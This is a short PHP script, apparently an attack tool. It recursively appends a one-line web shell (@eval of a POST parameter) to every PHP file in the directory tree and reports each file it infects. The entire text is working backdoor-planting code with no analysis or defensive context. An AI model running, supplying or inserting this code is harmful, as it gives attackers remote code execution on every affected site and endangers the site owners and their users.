<?php
$backdoor = "<?php
@eval(\$_POST[userid]); ?>";
foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator('.')) as $filename) {
    if ($filename->isFile() && $filename->getExtension() == 'php') {
        $content = file_get_contents($filename);
        if (strpos($content, $backdoor) === false) {
            file_put_contents($filename, $content . $backdoor);
            echo "success " . $filename . " intofile\n";
        }
    }
}